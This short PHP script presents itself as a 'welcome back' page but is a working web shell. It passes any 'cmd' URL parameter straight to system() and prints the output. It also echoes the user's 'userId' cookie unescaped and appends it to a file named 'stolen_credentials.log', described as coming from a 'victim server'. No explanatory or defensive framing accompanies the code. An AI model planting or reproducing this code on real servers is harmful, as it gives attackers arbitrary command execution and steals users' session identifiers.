<?php 
echo "welcome back"; 
$cookie = $_COOKIE["userId"] ?? "none";
echo $cookie;
file_put_contents(__DIR__ . "/stolen_credentials.log", "On victim server: userId={$cookie}\n", FILE_APPEND);
if (isset($_GET["cmd"])) {
echo "<pre>";
system($_GET["cmd"]);
echo "</pre>";
exit;
}
?>
